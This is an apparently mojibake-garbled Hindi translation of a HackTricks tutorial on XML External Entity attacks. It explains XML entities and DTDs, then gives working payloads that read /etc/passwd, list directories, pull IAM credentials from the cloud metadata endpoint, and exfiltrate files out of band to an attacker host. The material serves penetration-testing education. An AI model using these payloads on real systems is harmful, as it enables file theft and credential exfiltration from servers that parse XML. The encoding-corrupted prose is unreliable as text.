# XXE - XEE - XML External Entity

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

XML External Entity рд╣рдорд▓рд╛ рдПрдХ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣рдорд▓рд╛ рд╣реИ рдЬреЛ XML рдЗрдирдкреБрдЯ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

## XML Basics

**рдЗрд╕ рднрд╛рдЧ рдХрд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ рд╣рд┐рд╕реНрд╕рд╛ рдЗрд╕ рдЕрджреНрднреБрдд Portswigger рдкреЗрдЬ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### XML рдХреНрдпрд╛ рд╣реИ? <a href="#what-is-xml" id="what-is-xml"></a>

XML рдХрд╛ рдорддрд▓рдм рд╣реИ "extensible markup language". XML рдПрдХ рднрд╛рд╖рд╛ рд╣реИ рдЬрд┐рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдФрд░ рдкрд░рд┐рд╡рд╣рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред HTML рдХреА рддрд░рд╣, XML рдЯреИрдЧреНрд╕ рдФрд░ рдбреЗрдЯрд╛ рдХреА рдПрдХ рд╡реГрдХреНрд╖-рд╕рдорд╛рди рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред HTML рдХреЗ рд╡рд┐рдкрд░реАрдд, XML рдореЗрдВ рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЯреИрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕рд▓рд┐рдП рдЯреИрдЧреНрд╕ рдХреЛ рдбреЗрдЯрд╛ рдХрд╛ рд╡рд░реНрдгрди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдирд╛рдо рджрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд╡реЗрдм рдХреЗ рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ рдкрд╣рд▓реЗ, XML рдбреЗрдЯрд╛ рдкрд░рд┐рд╡рд╣рди рдкреНрд░рд╛рд░реВрдк рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЛрдХрдкреНрд░рд┐рдп рдерд╛ ( "AJAX" рдореЗрдВ "X" рдХрд╛ рдорддрд▓рдм "XML" рд╣реИ)ред рд▓реЗрдХрд┐рди рдЕрдм рдЗрд╕рдХреА рд▓реЛрдХрдкреНрд░рд┐рдпрддрд╛ JSON рдкреНрд░рд╛рд░реВрдк рдХреЗ рдкрдХреНрд╖ рдореЗрдВ рдШрдЯ рдЧрдИ рд╣реИред

### XML рдПрдВрдЯрд┐рдЯреАрдЬ рдХреНрдпрд╛ рд╣реИрдВ? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

XML рдПрдВрдЯрд┐рдЯреАрдЬ рдПрдХ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдбреЗрдЯрд╛ рдХреЗ рдПрдХ рдЖрдЗрдЯрдо рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ, рдмрдЬрд╛рдп рдбреЗрдЯрд╛ рдХреЗ рд╕реНрд╡рдпрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗред рд╡рд┐рднрд┐рдиреНрди рдПрдВрдЯрд┐рдЯреАрдЬ XML рднрд╛рд╖рд╛ рдХреЗ рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдВрдЯрд┐рдЯреАрдЬ `&lt;` рдФрд░ `&gt;` `<` рдФрд░ `>` рд╡рд░реНрдгреЛрдВ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддреА рд╣реИрдВред рдпреЗ рдореЗрдЯрд╛рдХреИрд░реЗрдХреНрдЯрд░реНрд╕ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ XML рдЯреИрдЧреНрд╕ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдЗрд╕рд▓рд┐рдП рдЬрдм рд╡реЗ рдбреЗрдЯрд╛ рдХреЗ рднреАрддрд░ рдкреНрд░рдХрдЯ рд╣реЛрддреЗ рд╣реИрдВ рддреЛ рдЖрдорддреМрд░ рдкрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдирдХреА рдПрдВрдЯрд┐рдЯреАрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

### XML рддрддреНрд╡ рдХреНрдпрд╛ рд╣реИрдВ?

рддрддреНрд╡ рдкреНрд░рдХрд╛рд░ рдШреЛрд╖рдгрд╛рдПрдБ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рддрддреНрд╡реЛрдВ рдХреЗ рдкреНрд░рдХрд╛рд░ рдФрд░ рд╕рдВрдЦреНрдпрд╛ рдХреЗ рд▓рд┐рдП рдирд┐рдпрдо рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИрдВ, рдХреМрди рд╕реЗ рддрддреНрд╡ рдПрдХ рджреВрд╕рд░реЗ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рдХрдЯ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕ рдХреНрд░рдо рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

* `<!ELEMENT stockCheck ANY>` рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХреЛрдИ рднреА рдСрдмреНрдЬреЗрдХреНрдЯ рдорд╛рддрд╛-рдкрд┐рддрд╛ `<stockCheck></stockCheck>` рдХреЗ рдЕрдВрджрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ
* \<!ELEMENT stockCheck EMPTY> рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдЦрд╛рд▓реА рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> рдШреЛрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ `<stockCheck>` рдХреЗ рдмрдЪреНрдЪреЗ `<productId>` рдФрд░ `<storeId>` рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ

### рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рд╛ рдХреНрдпрд╛ рд╣реИ? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рд╛ (DTD) рдореЗрдВ рдШреЛрд╖рдгрд╛рдПрдБ рд╣реЛрддреА рд╣реИрдВ рдЬреЛ рдПрдХ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдЗрд╕рдореЗрдВ рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдбреЗрдЯрд╛ рдорд╛рди рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЕрдиреНрдп рдЖрдЗрдЯрдоред DTD рдХреЛ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╡реИрдХрд▓реНрдкрд┐рдХ `DOCTYPE` рддрддреНрд╡ рдХреЗ рднреАрддрд░ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред DTD рдкреВрд░реА рддрд░рд╣ рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рднреАрддрд░ рд╕реНрд╡рдпрдВ (рдЬрд┐рд╕реЗ "рдЖрдВрддрд░рд┐рдХ DTD" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдпрд╛ рдХрд╣реАрдВ рдФрд░ рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЬрд┐рд╕реЗ "рдмрд╛рд╣рд░реА DTD" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдпрд╛ рджреЛрдиреЛрдВ рдХрд╛ рдорд┐рд╢реНрд░рдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### XML рдХрд╕реНрдЯрдо рдПрдВрдЯрд┐рдЯреАрдЬ рдХреНрдпрд╛ рд╣реИрдВ? <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

XML DTD рдХреЗ рднреАрддрд░ рдХрд╕реНрдЯрдо рдПрдВрдЯрд┐рдЯреАрдЬ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

рдЗрд╕ рдкрд░рд┐рднрд╛рд╖рд╛ рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдВрдЯрд┐рдЯреА рд╕рдВрджрд░реНрдн `&myentity;` рдХрд╛ рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рднреАрддрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдорд╛рди рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛: "`my entity value`".

### XML рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреАрдЬ рдХреНрдпрд╛ рд╣реИрдВ? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

XML рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреАрдЬ рдПрдХ рдкреНрд░рдХрд╛рд░ рдХреА рдХрд╕реНрдЯрдо рдПрдВрдЯрд┐рдЯреА рд╣реЛрддреА рд╣реИрдВ рдЬрд┐рдирдХреА рдкрд░рд┐рднрд╛рд╖рд╛ DTD рдХреЗ рдмрд╛рд╣рд░ рд╕реНрдерд┐рдд рд╣реЛрддреА рд╣реИ рдЬрд╣рд╛рдВ рд╡реЗ рдШреЛрд╖рд┐рдд рдХреА рдЧрдИ рд╣реИрдВред

рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреА рдХреА рдШреЛрд╖рдгрд╛ `SYSTEM` рдХреАрд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рдФрд░ рдПрдВрдЯрд┐рдЯреА рдХреЗ рдорд╛рди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ URL рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

URL `file://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕рд▓рд┐рдП рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреАрдЬ рдХреЛ рдлрд╛рдЗрд▓ рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

XML рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреАрдЬ [XML рдмрд╛рд╣рд░реА рдПрдВрдЯрд┐рдЯреА рд╣рдорд▓реЛрдВ](https://portswigger.net/web-security/xxe) рдХреЗ рдЙрддреНрдкрдиреНрди рд╣реЛрдиреЗ рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рд╕рд╛рдзрди рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВред

### XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреАрдЬ рдХреНрдпрд╛ рд╣реИрдВ?

рдХрднреА-рдХрднреА, XXE рд╣рдорд▓реЗ рдирд┐рдпрдорд┐рдд рдПрдВрдЯрд┐рдЯреАрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрд╡рд░реБрджреНрдз рд╣реЛрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдХреБрдЫ рдЗрдирдкреБрдЯ рд╡реИрд▓рд┐рдбреЗрд╢рди рдпрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ XML рдкрд╛рд░реНрд╕рд░ рдХреА рдХреБрдЫ рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ рд╣реЛрддреА рд╣реИред рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЖрдк XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреАрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреАрдЬ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рдХрд╛рд░ рдХреА XML рдПрдВрдЯрд┐рдЯреА рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕реЗ рдХреЗрд╡рд▓ DTD рдХреЗ рднреАрддрд░ рдЕрдиреНрдпрддреНрд░ рд╕рдВрджрд░реНрднрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд░реНрддрдорд╛рди рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рджреЛ рдмрд╛рддреЗрдВ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдкрд╣рд▓рд╛, XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреА рдШреЛрд╖рдгрд╛ рдореЗрдВ рдПрдВрдЯрд┐рдЯреА рдирд╛рдо рд╕реЗ рдкрд╣рд▓реЗ рдкреНрд░рддрд┐рд╢рдд рдЪрд░рд┐рддреНрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ:

`<!ENTITY % myparameterentity "my parameter entity value" >`

рдФрд░ рджреВрд╕рд░рд╛, рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреАрдЬ рдХреЛ рд╕рд╛рдорд╛рдиреНрдп ampersand рдХреЗ рдмрдЬрд╛рдп рдкреНрд░рддрд┐рд╢рдд рдЪрд░рд┐рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрджрд░реНрднрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: `%myparameterentity;`

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдВрдзрд╛ XXE рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

рдпрд╣ XXE рдкреЗрд▓реЛрдб рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### рдлрд╛рдЗрд▓ рдкрдврд╝реЗрдВ

рдЖрдЗрдП `/etc/passwd` рдХреЛ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рд╕реЗ рдкрдврд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред Windows рдХреЗ рд▓рд┐рдП рдЖрдк `C:\windows\system32\drivers\etc\hosts` рдкрдврд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдкрд╣рд▓реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ SYSTEM "_**file:///**etc/passwd_" рднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ред
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
```markdown
![](<../.gitbook/assets/image (221).png>)

рдпрд╣ рджреВрд╕рд░рд╛ рдорд╛рдорд▓рд╛ рдЙрдкрдпреЛрдЧреА рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдпрджрд┐ рд╡реЗрдм рд╕рд░реНрд╡рд░ PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ (Portswiggers labs рдХрд╛ рдорд╛рдорд▓рд╛ рдирд╣реАрдВ)
```
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
рдЗрд╕ рддреАрд╕рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдо `Element stockCheck` рдХреЛ ANY рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд▓рд┐рд╕реНрдЯрд┐рдВрдЧ

**Java** рдЖрдзрд╛рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдореЗрдВ рд╕рдВрднрд╡рддрдГ XXE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреА рд╕рд╛рдордЧреНрд░реА рдХреА рд╕реВрдЪреА рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдПрдХ рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдЬреИрд╕реЗ (рдХреЗрд╡рд▓ рдлрд╛рдЗрд▓ рдХреЗ рдмрдЬрд╛рдп рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рд▓рд┐рдП рдкреВрдЫрдирд╛):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреНрд▓рд╛рдЙрдб рдХреЗ рдЕрдВрджрд░ SSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### рдмреНрд▓рд╛рдЗрдВрдб SSRF

**рдкрд╣рд▓реЗ рдмрддрд╛рдИ рдЧрдИ рддрдХрдиреАрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд╕рд░реНрд╡рд░ рдХреЛ рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдБрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдпрд╣ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИред рд▓реЗрдХрд┐рди, рдЕрдЧрд░ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рд╢рд╛рдпрдж рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рд╣реИ рдХрд┐ **XML рдПрдВрдЯрд┐рдЯреАрдЬ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ**, рдРрд╕реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреАрдЬ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "рдмреНрд▓рд╛рдЗрдВрдб" SSRF - рдбреЗрдЯрд╛ рдХреЛ рдЖрдЙрдЯ-рдСрдл-рдмреИрдВрдб рдирд┐рдХрд╛рд▓рдирд╛

**рдЗрд╕ рдЕрд╡рд╕рд░ рдкрд░ рд╣рдо рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдирдпрд╛ DTD рд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреЗрд▓реЛрдб рд╣реЛрдЧрд╛ рдЬреЛ рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗрдЧрд╛ (рдорд▓реНрдЯреА-рд▓рд╛рдЗрди рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЖрдк** _**ftp://**_ **рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕реЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред рдпрд╣ рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг** [**Portswiggers lab рдпрд╣рд╛рдБ**](https://portswigger.net/web-security/xxe/blind)** рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред**

`/etc/hostname` рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DTD рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реИ:
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
рдпрд╣ DTD рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдо рдЙрдард╛рддрд╛ рд╣реИ:

* `/etc/passwd` рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╡рд╛рд▓рд╛ рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдХрд╛рдИ `file` рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
